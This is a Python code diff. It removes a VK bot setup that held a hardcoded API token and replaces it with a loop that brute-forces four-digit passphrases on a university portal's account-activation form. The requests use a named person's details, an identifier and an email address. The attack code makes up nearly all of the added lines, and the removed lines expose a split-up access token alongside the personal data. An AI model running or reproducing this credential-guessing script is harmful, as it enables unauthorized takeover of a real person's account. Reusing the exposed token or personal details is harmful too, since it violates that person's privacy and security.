@@ -1,42 +1,28 @@
 import os
 import requests
-import json
-import datetime
-from datetime import datetime, date, time
-import calendar
-
-import vk_api
-from vk_api import VkUpload
-from vk_api.longpoll import VkLongPoll, VkEventType
-from vk_api.keyboard import VkKeyboard, VkKeyboardColor
-from vk_api.utils import get_random_id
 
 def main():
-    session = requests.Session()
     client = requests.Session()
 
-    vk_session = vk_api.VkApi(token='3a1966' + 'a9dd09543a8b81ece18' + 'b57359fd6f5ef' + '449e7e64b6ecd' + 'df820b5f5d543c9f00' + 'f9e73c86'+ '40b5f3bf')
+    passport = 0
+    while passport < 10000:
+        print("\n\n\n\n\n\npassport: {}\n".format(passport))
 
-    vk = vk_session.get_api()
+        body = ""
+        if passport < 10:
+            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=000{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
+        elif passport < 100:
+            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=00{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
+        elif passport < 1000:
+            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D=0{}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
+        elif passport < 10000:
+            body = "utf8=%E2%9C%93&authenticity_token=uovKG5WinHeA%2FaOjnkPySJnc1YAjp2qmAqiT0pUK%2BiEEPg3sWdYsOJMsw0GTU9SnfLFQ2CheNXFBOx3T6yHFog%3D%3D&user%5Blast_name%5D=%D0%A1%D0%BE%D0%BA%D0%B0%D1%81%D1%8F%D0%BD&user%5Bfirst_name%5D=%D0%98%D1%80%D1%8D%D0%BD%D0%B0&user%5Bidentifier%5D=2107090&user%5Bpassphrase%5D={}&user%5Bverification_mail%5D=school3kzk%40yandex.ru&commit=%D0%90%D0%BA%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C".format(passport)
 
-    # Get csrf token =/
-    #client = requests.get('https://edu.misis.ru/schedule/moscow/current')
-    #csrftoken = client.text[361:449] # should not be hardcoded probably yes???
+        client = requests.post('https://lk.misis.ru/method/schedule.get', body)
+        if ("К сожалению нам не удалось найти сотрудника" in client.text or passport < 1):
+            print(client.text)
 
-    headers = {
-               #'x-csrf-token': csrftoken, # no necessity to pass csrf token in header wtf why omfg o_0 ??
-              }
-    body =    {
-               'filial': 880,
-               'group': '7121',
-               'room': None,
-               'teacher': None,
-               'start_date': string_datetime,
-               'end_date': None
-               }
-
-    client = requests.post('https://lk.misis.ru/method/schedule.get', body, headers)
-    print(client.text)
+        passport = passport + 1
 
 if __name__ == '__main__':
     main()
